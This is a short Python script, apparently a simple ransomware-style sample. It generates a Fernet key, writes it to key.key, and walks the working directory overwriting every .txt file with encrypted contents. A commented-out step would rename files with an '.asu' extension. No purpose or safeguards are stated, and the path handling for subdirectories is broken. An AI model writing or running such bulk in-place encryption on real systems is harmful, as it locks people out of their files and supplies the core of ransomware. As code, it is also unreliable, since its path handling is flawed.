from cryptography.fernet import Fernet
import os

# Generate key
key=Fernet.generate_key()

# Save key to file
with open("key.key","wb") as f:
    f.write(key)

# Create Fernet object with the generated key
fernet = Fernet(key)

# Encrypt content of text files
for i in os.walk(os.getcwd()):
    # print(i[2])
    for j in i[2]:
        if str(j).endswith(".txt"):
            # print(j)
            with open(str(j),"r") as f:
                data=f.read()

            encrypted = fernet.encrypt(data.encode())

            with open(str(j),"wb") as f:
                f.write(encrypted)

            # print(encrypted)
                
            # # add new extention   
            # new_file_path =  j + ".asu"
            # os.rename(j, new_file_path)
